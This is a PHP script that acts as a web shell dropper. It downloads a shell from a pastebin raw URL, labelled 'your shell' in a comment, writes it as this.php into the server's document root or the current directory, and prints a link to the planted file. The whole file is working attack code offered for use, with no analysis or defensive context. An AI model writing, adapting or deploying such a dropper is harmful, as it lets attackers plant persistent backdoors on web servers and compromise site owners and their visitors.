<?php
	$shell  = "https://pastebin.com/raw/xvtE6rXh"; // your shell
	$name =  "this.php"; // name of shell
	function bypass($name,$file){
		$filename =  $name;
		$get =  file_get_contents($file);
		$dir = $_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR;
		$open = fopen("$dir/$filename", 'w');
		$write =  fwrite($open, $get);
		$dirshell = $_SERVER['HTTPS'] ? "https" : "http" . "://$_SERVER[HTTP_HOST]"."/$filename";
		$path = getcwd().DIRECTORY_SEPARATOR;
		$to = fopen("$path/$filename", 'w');
		$toas = fwrite($to, $get);
		$pathshell = $_SERVER['HTTPS'] ? "https" : "http" . "://$_SERVER[HTTP_HOST]".dirname($_SERVER[REQUEST_URI])."/$filename";
		echo "<center>";
		if($write){
			if (file_exists($dir."$filename")) {
				echo "<h1><font color=\"#00ff00\">SUCCESS <a href=\"$dirshell\" target=\"_blank\">$dirshell</a></h1></font>";
			}
			else {
				echo "<h1><font color=\"red\">$dir$file</br>FAILED!!</font></h1>";
			}
		}
		else {
			if ($toas) {
				if (file_exists($path."$filename")) {
					echo "<h1><font color=\"#00ff00\">SUCCESS <a href=\"$pathshell\" target=\"_blank\">$pathshell</a></h1></font>";
				}
				else {
					echo "<h1><font color=\"red\">$dir$filename</br>FAILED!!</font></h1>";
				}
			}
		}
		echo "</center>";
	}
	bypass($name,$shell);
?>